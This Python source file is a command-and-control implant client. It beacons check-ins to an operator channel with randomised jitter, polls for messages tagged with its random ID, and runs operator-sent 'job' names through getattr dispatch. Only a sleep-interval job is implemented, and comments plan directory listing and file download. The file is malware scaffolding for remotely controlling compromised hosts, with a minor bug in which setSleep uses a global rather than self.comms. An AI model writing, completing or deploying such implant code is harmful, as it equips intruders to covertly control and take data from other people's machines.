#! /usr/bin/env python

import os
import sys
import string
import random
from time import sleep

from comms import Comms

from params import *

class ImplantComms(Comms):
    def __init__(self, channel, encoders, channelParams, encoderParams):
        super(ImplantComms, self).__init__(channel, encoders, channelParams, encoderParams)

        # actual sleep time will be randomly chosen between the following two
        self.minSleepTime = 1 # minimum seconds to sleep between checkins
        self.maxSleepTime = 5 # maximum seconds to sleep between checkins

        # generate a uid for ourselves
        self.uid = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(20)])

    def sendCheckin(self):
        """ sends a checkin packet on the feed """
        self.send("{}:checkin".format(self.uid))

    def sendMessage(self, msg):
        """ sends a generic 'message' packet on the feed """
        self.send("{}:message:{}".format(self.uid, msg))

    def setSleep(self, minSleep, maxSleep):
        """ sets the amount of time to sleep between checkins """
        self.minSleepTime = float(minSleep)
        self.maxSleepTime = float(maxSleep)

    def receive(self):
        """ Retrieve messages from the comms feed and return them if they're
            for us """
        msgs = self.feed.receive()
        forUs = []

        for msg in msgs:
            tokenized = msg.split(":", 4)
            if tokenized[0] == self.uid:
                forUs.append(tokenized[1:])

        print("messages for us:")
        print(forUs)
        print("----------")
        return forUs


class Jobs:
    """ Contains definitions for all the tasks this implant can carry out """
    def __init__(self, comms):
        self.completed = []
        self.comms = comms

    # TODO:
    # checkin - orders all implants to send a checkin packet
    # ls - lists a directory
    # download - downloads a file

    def setSleep(self, cmdString):
        """ update the minimum and maximum sleep times
            cmdString format:
                minTime-maxTime
        """
        args = cmdString.split('-')
        # args should now contain [minTime, maxTime]
        try:
            comms.setSleep(int(args[0]), int(args[1]))
        except ValueError:
            # setSleep was unable to parse the arguments to floats
            self.comms.sendMessage('unable to update sleep time')

    def handle(self, msg):
        """ when passed a job message, handles it appropriately
            (either executes it, or checks that we've already done it)
        """
        print("WE GOT A JOB TA DO")

        print(msg)
        [jobId, jobType, cmdString] = msg

        # if we've already done this job, continue
        # otherwise mark it as done, then farm it out
        if jobId in self.completed:
            print('nevermind, we already did this')
            return
        else:
            self.completed.append(jobId)

            # call the function with the name jobType
            getattr(self, jobType)(cmdString)
            # TODO in a thread


if __name__ == "__main__":
    # set up our comms channel
    comms = ImplantComms(channel, encoders, channelParams, encoderParams)

    print("Our UID is: {}".format(comms.uid))

    # set up our jobs handler
    jobs = Jobs(comms)

    # check in
    comms.sendCheckin()

    try:
        while True:
            # get the latest messages
            msgs = comms.receive()
            # run through them all and route them appropriately
            for message in msgs:
                if message[0] == 'job':
                    # have the jobs object handle this job
                    jobs.handle(message[1:])

            sleepTime = random.uniform(comms.minSleepTime, comms.maxSleepTime)
            print(sleepTime)
            sleep(sleepTime)

    except KeyboardInterrupt:
        pass
